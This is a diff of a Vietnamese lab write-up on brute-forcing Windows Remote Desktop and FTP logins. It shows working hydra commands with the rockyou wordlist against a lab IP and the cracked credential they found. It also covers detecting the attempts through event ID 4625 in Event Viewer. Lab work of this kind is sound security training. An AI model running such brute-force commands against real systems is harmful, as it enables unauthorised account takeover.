@@ -5,7 +5,11 @@ Brute Force Attacks vào Windows Remote Desktop
 
 Cú pháp: `hydra -t 1 -V -f -l Jason -P /usr/share/wordlists/rockyou.txt rdp://192.168.108.194`
 
-Kết quả: ![alt text](lab4.png) ![alt text](lab4_1.png)
+Kết quả:
+
+![alt text](lab4.png) 
+
+![alt text](lab4_1.png)
 
 
 ==> Thành công với `user&pass: Jason:qwerty`
@@ -14,7 +18,13 @@ Kết quả: ![alt text](lab4.png) ![alt text](lab4_1.png)
 
  Cú pháp: `hydra -V -t 4 -l Martin -P /usr/share/wordlists/rockyou.txt ftp://192.168.108.194`
 
- Kết quả: ![alt text](lan4_2.png) ![alt text](lan4_3.png) ![alt text](lab4_4.png)
+ Kết quả: 
+ 
+ ![alt text](lan4_2.png) 
+ 
+ ![alt text](lan4_3.png)
+ 
+  ![alt text](lab4_4.png)
 
 Dùng Event Viewer trên windows server 2022 để lọc các tấn công brute force mã `event ID 4625`
 
@@ -52,6 +62,8 @@ Kết quả: rất nhiều login với tên Jason và ip login
 
 
 ### Task 2: Local Logging: Cấu hình, Giám sát và Phân tích IIS Logs
+
+
 
 
 
